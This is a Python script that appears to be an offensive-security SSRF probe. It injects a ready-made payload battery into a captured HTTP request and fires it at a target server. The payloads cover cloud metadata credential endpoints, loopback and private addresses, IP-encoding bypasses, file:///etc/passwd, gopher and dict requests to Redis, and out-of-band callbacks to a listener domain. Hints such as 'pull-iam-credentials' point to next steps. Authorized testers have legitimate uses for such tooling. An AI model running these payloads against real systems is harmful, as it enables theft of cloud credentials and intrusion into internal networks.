#!/usr/bin/env python3
"""ssrf_probe.py - SSRF probe battery for one API sink.

Takes a raw HTTP request template containing the marker __SSRF__ where the
URL-shaped value belongs, plus an out-of-band (OOB) listener/interactsh
domain. Sends a baseline, OOB payloads (unique token subdomain per probe),
internal targets, cloud-metadata URLs, and encoding/bypass variants. Reports
which variants changed status/length/time or returned recognizable internal
content. The OOB hit itself is confirmed on the listener side (interactsh
-json output or scripts/oob_listener.py reports/oob-hits.jsonl) by matching
the per-payload token.

Output (atomic writes):
  reports/api-ssrf-probes.json  - normalized results for every payload
  reports/api-ssrf-units.json   - rupu work units for interesting variants

Usage:
  python3 scripts/ssrf_probe.py --template reports/webhook.req --tls \
      --oob oob.example.net --out reports
  python3 scripts/ssrf_probe.py --template req.txt --target 192.0.2.10:8080 \
      --ports 80,443,6379 --extra-url http://10.0.0.5:8500/v1/kv/?recurse
"""

import argparse
import http.client
import json
import os
import ssl
import sys
import time
import urllib.parse

MARKER = "__SSRF__"
BODY_READ_CAP = 65536
TARGET_CAP = 200

INDICATORS = [
    ("aws-metadata", ["ami-id", "instance-id", "security-credentials",
                      "AccessKeyId", "latest/meta-data"]),
    ("gcp-metadata", ["computeMetadata", "metadata.google.internal",
                      "access_token"]),
    ("azure-metadata", ["azEnvironment", "osProfile", "vmId"]),
    ("file-read", ["root:x:0:0", "daemon:x:"]),
    ("redis", ["redis_version", "-ERR unknown command"]),
    ("ssh-banner", ["SSH-2.0", "SSH-1."]),
    ("conn-error", ["Connection refused", "ECONNREFUSED", "No route to host",
                    "timed out", "getaddrinfo", "Name or service not known",
                    "connect timed out", "UnknownHostException"]),
]

TITLES = {
    "oob": "ssrf-oob-pending-check",
    "metadata": "ssrf-metadata-content",
    "inband": "ssrf-inband-diff",
    "timing": "ssrf-timing-oracle",
    "error": "ssrf-error-oracle",
    "bypass": "ssrf-bypass-candidate",
}


def parse_template(text):
    text = text.replace("\r\n", "\n")
    if "\n\n" in text:
        head, body = text.split("\n\n", 1)
    else:
        head, body = text, ""
    lines = head.split("\n")
    reqline = lines[0].split()
    if len(reqline) < 2:
        sys.exit("[-] template: bad request line: %r" % lines[0])
    method, path = reqline[0], reqline[1]
    headers = []
    for line in lines[1:]:
        if not line.strip():
            continue
        if ":" not in line:
            sys.exit("[-] template: bad header line: %r" % line)
        k, v = line.split(":", 1)
        headers.append((k.strip(), v.strip()))
    return method, path, headers, body


def build_payloads(oob, ports, extra_urls, baseline_url):
    """Return list of dicts: token, category, name, value."""
    out = []
    idx = [0]

    def add(category, name, value):
        idx[0] += 1
        tok = "p%02d" % idx[0]
        out.append({"token": tok, "category": category,
                    "name": name, "value": value})
        return tok

    add("baseline", "baseline", baseline_url)

    if oob:
        # token subdomain per probe => listener hit correlates to payload
        def ohost(t):
            return "%s.%s" % (t, oob)
        t = "p%02d" % (idx[0] + 1)
        add("oob", "oob-http", "http://%s/" % ohost(t))
        t = "p%02d" % (idx[0] + 1)
        add("oob", "oob-https", "https://%s/" % ohost(t))
        t = "p%02d" % (idx[0] + 1)
        add("oob", "oob-userinfo-confusion",
            "http://example.com@%s/" % ohost(t))

    internal = [
        ("localhost", "http://localhost/"),
        ("loopback", "http://127.0.0.1/"),
        ("ipv6-loopback", "http://[::1]/"),
        ("zeros", "http://0.0.0.0/"),
        ("rfc1918-10", "http://10.0.0.1/"),
        ("rfc1918-172", "http://172.16.0.1/"),
        ("rfc1918-192", "http://192.168.0.1/"),
    ]
    for name, val in internal:
        add("internal", name, val)
    for p in ports:
        add("internal", "loopback-port-%s" % p, "http://127.0.0.1:%s/" % p)

    metadata = [
        ("aws-imdsv1-root", "http://169.254.169.254/latest/meta-data/"),
        ("aws-imdsv1-creds",
         "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("aws-userdata", "http://169.254.169.254/latest/user-data"),
        ("gcp-metadata",
         "http://metadata.google.internal/computeMetadata/v1/"),
        ("azure-imds",
         "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("ecs-creds", "http://169.254.170.2/v2/credentials/"),
    ]
    for name, val in metadata:
        add("metadata", name, val)

    bypass = [
        ("decimal-loopback", "http://2130706433/"),
        ("decimal-imds", "http://2852039166/"),
        ("hex-loopback", "http://0x7f000001/"),
        ("octal-loopback", "http://0177.0.0.1/"),
        ("short-loopback", "http://127.1/"),
        ("ipv6-mapped", "http://[::ffff:127.0.0.1]/"),
        ("nip-io-loopback", "http://127.0.0.1.nip.io/"),
        ("nip-io-imds", "http://169.254.169.254.nip.io/"),
        ("userinfo-imds",
         "http://example.com@169.254.169.254/latest/meta-data/"),
        ("file-passwd", "file:///etc/passwd"),
        ("dict-redis", "dict://127.0.0.1:6379/info"),
        ("gopher-redis", "gopher://127.0.0.1:6379/_%2a1%0d%0a%244%0d%0aINFO%0d%0a"),
    ]
    for name, val in bypass:
        add("bypass", name, val)

    for i, u in enumerate(extra_urls):
        add("extra", "extra-%d" % i, u)
    return out


def inject(method, path, headers, body, payload, raw):
    p2 = path
    if MARKER in path:
        enc = payload if raw else urllib.parse.quote(payload, safe="")
        p2 = path.replace(MARKER, enc)
    b2 = body.replace(MARKER, payload) if MARKER in body else body
    h2 = []
    for k, v in headers:
        v = v.replace(MARKER, payload)
        if k.lower() == "content-length":
            v = str(len(b2.encode()))
        h2.append((k, v))
    return method, p2, h2, b2


def send(host, port, tls, method, path, headers, body, timeout):
    start = time.monotonic()
    try:
        if tls:
            ctx = ssl._create_unverified_context()
            conn = http.client.HTTPSConnection(host, port, timeout=timeout,
                                               context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.putrequest(method, path, skip_host=True, skip_accept_encoding=True)
        seen_host = False
        for k, v in headers:
            if k.lower() == "host":
                seen_host = True
            conn.putheader(k, v)
        if not seen_host:
            conn.putheader("Host", host)
        conn.endheaders(body.encode() if body else None)
        resp = conn.getresponse()
        data = resp.read(BODY_READ_CAP)
        elapsed = time.monotonic() - start
        conn.close()
        return {"status": resp.status, "length": len(data),
                "time": round(elapsed, 3),
                "snippet": data[:800].decode("utf-8", "replace"),
                "error": None}
    except Exception as exc:
        return {"status": None, "length": 0,
                "time": round(time.monotonic() - start, 3),
                "snippet": "", "error": "%s: %s" % (type(exc).__name__, exc)}


def match_indicators(result):
    hay = (result.get("snippet") or "") + " " + (result.get("error") or "")
    hits = []
    for name, needles in INDICATORS:
        if any(n in hay for n in needles):
            hits.append(name)
    return hits


def classify(res, base, time_threshold, len_threshold):
    """Return (interesting, title, hints) using the fixed vocabulary."""
    cat = res["category"]
    ind = res["indicators"]
    hints = []
    if cat == "oob":
        return True, TITLES["oob"], ["check-listener-for-token",
                                     "token:%s" % res["token"]]
    meta_ind = [i for i in ind if i.endswith("-metadata") or
                i in ("file-read", "redis", "ssh-banner")]
    if meta_ind:
        h = ["pull-iam-credentials", "see-cloud-metadata-md"] \
            if any("metadata" in i for i in meta_ind) else ["see-sinks-md"]
        return True, TITLES["metadata"], h
    if base is None:
        return False, "", []
    sdiff = res["status"] != base["status"]
    ldiff = abs(res["length"] - base["length"]) > len_threshold
    tdiff = (res["time"] - base["time"]) > time_threshold
    if "conn-error" in ind:
        return True, TITLES["error"], ["port-scan-inband"]
    if tdiff:
        return True, TITLES["timing"], ["port-scan-inband"]
    if sdiff or ldiff:
        title = TITLES["bypass"] if cat == "bypass" else TITLES["inband"]
        if cat == "bypass":
            hints = ["try-bypass-set"]
        else:
            hints = ["port-scan-inband"]
        return True, title, hints
    return False, "", []


def atomic_write(path, obj):
    tmp = path + ".tmp"
    with open(tmp, "w") as fh:
        json.dump(obj, fh, indent=2)
        fh.write("\n")
    os.replace(tmp, path)


def main():
    ap = argparse.ArgumentParser(description="SSRF probe battery")
    ap.add_argument("--template", required=True,
                    help="raw HTTP request file containing __SSRF__")
    ap.add_argument("--target", default=None,
                    help="host[:port] override (default: template Host header)")
    ap.add_argument("--tls", action="store_true", help="use HTTPS")
    ap.add_argument("--oob", default=None,
                    help="collaborator/listener domain, e.g. oob.example.net")
    ap.add_argument("--baseline", default="https://example.com/robots.txt",
                    help="benign fetchable URL used as the diff baseline")
    ap.add_argument("--ports", default="22,80,443,3306,6379,8080",
                    help="comma list for 127.0.0.1:<port> sweep")
    ap.add_argument("--extra-url", action="append", default=[],
                    help="additional payload URL (repeatable)")
    ap.add_argument("--raw", action="store_true",
                    help="do not URL-encode payloads injected into the path")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--delay", type=float, default=0.0,
                    help="seconds between probes")
    ap.add_argument("--time-threshold", type=float, default=3.0)
    ap.add_argument("--len-threshold", type=int, default=100)
    ap.add_argument("--out", default="reports", help="output directory")
    args = ap.parse_args()

    with open(args.template) as fh:
        method, path, headers, body = parse_template(fh.read())
    if MARKER not in path and MARKER not in body and \
            not any(MARKER in v for _, v in headers):
        sys.exit("[-] marker %s not found in template" % MARKER)

    host = port = None
    if args.target:
        t = args.target
        if "://" in t:
            u = urllib.parse.urlsplit(t)
            host, port = u.hostname, u.port
        elif ":" in t:
            host, p = t.rsplit(":", 1)
            port = int(p)
        else:
            host = t
    else:
        for k, v in headers:
            if k.lower() == "host":
                host = v.split(":")[0]
                if ":" in v:
                    port = int(v.split(":")[1])
    if not host:
        sys.exit("[-] no target: use --target or a Host header")
    if port is None:
        port = 443 if args.tls else 80

    ports = [p.strip() for p in args.ports.split(",") if p.strip()]
    payloads = build_payloads(args.oob, ports, args.extra_url, args.baseline)
    route = "%s %s" % (method, path.replace(MARKER, "{url}").split("?")[0])

    print("[*] %d payloads -> %s:%s (%s)" % (len(payloads), host, port, route))
    results = []
    base = None
    for pl in payloads:
        m, p2, h2, b2 = inject(method, path, headers, body, pl["value"],
                               args.raw)
        r = send(host, port, args.tls, m, p2, h2, b2, args.timeout)
        rec = dict(pl)
        rec.update(r)
        rec["indicators"] = match_indicators(r)
        if pl["category"] == "baseline":
            base = rec
        d = ""
        if base and pl["category"] != "baseline" and rec["status"] is not None:
            d = " d_len=%+d d_t=%+.1fs" % (rec["length"] - base["length"],
                                           rec["time"] - base["time"])
        print("  [%s] %-24s status=%s len=%s t=%.1fs%s %s"
              % (pl["token"], pl["name"], rec["status"], rec["length"],
                 rec["time"], d, ",".join(rec["indicators"])))
        results.append(rec)
        if args.delay:
            time.sleep(args.delay)

    units = []
    n = 0
    for rec in results:
        if rec["category"] == "baseline":
            rec["interesting"] = False
            continue
        interesting, title, hints = classify(rec, base, args.time_threshold,
                                             args.len_threshold)
        rec["interesting"] = interesting
        if interesting:
            n += 1
            units.append({
                "id": "api-ssrf-u%02d" % n,
                "title": title,
                "targets": [route[:TARGET_CAP], rec["value"][:TARGET_CAP]],
                "hints": hints,
            })

    os.makedirs(args.out, exist_ok=True)
    probes_path = os.path.join(args.out, "api-ssrf-probes.json")
    units_path = os.path.join(args.out, "api-ssrf-units.json")
    atomic_write(probes_path, {
        "route": route, "host": host, "port": port, "tls": args.tls,
        "oob": args.oob, "baseline": base, "results": results,
    })
    atomic_write(units_path, units)
    print("[*] wrote %s (%d results) and %s (%d units)"
          % (probes_path, len(results), units_path, len(units)))
    if args.oob:
        print("[*] now match tokens pNN against the OOB listener "
              "(interactsh -json / reports/oob-hits.jsonl)")


if __name__ == "__main__":
    main()
